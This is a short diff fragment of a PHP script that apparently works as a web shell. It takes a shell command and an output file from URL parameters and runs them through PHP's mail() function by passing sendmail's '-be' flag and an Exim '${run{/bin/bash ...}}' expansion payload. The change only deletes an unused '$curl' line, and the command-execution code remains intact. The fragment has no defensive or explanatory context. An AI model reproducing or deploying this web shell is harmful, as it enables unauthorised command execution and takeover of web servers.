@@ -7,7 +7,6 @@ $comd = @$_GET[c];
 $fl = @$_GET[p];
 @ob_start();
 $headers = "From: rinto@plantsec.org";
-$curl = "curl";
 $ms = 'Exec: ${run{/bin/bash -c "'.$comd.' >'.$fl.'"}}';
 $senders = "rinto@plantsec.org -be";
 @mail("kreonrinto@gmail.com", "Owalah Tempix", $ms, $headers, " -f $senders ");
